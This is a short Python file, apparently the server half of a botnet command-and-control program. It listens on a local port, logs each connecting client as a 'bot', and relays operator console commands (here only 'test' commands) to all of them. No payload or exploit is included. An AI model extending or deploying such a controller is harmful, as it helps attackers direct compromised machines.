import socket
from threading import Thread
import handler
from database_management import *
import sys

global server,ip,port,status,bots
bots = []
status = False
server = socket.socket()
ip = '127.0.0.1'
port = 2003

def start():
    global status
    server.bind((ip,port))
    server.listen(5)
    while True:
        client,addr = server.accept()
        if str(addr[0]) not in bots:
            bots.append(str(addr[0]))
        t = Thread(target=handler.Handler,args=(client,str(addr[0])))
        t.start()

def get_cmd():
    while True:
        cmd = str(input('>'))
        if cmd == 'quit':
            sys.exit(1)
        elif 'test' in cmd:
            for i in bots:
                issue_cmd(cmd.strip(),i.strip())
        
if __name__ == '__main__':
    t = Thread(target=start)
    t.start()
    get_cmd()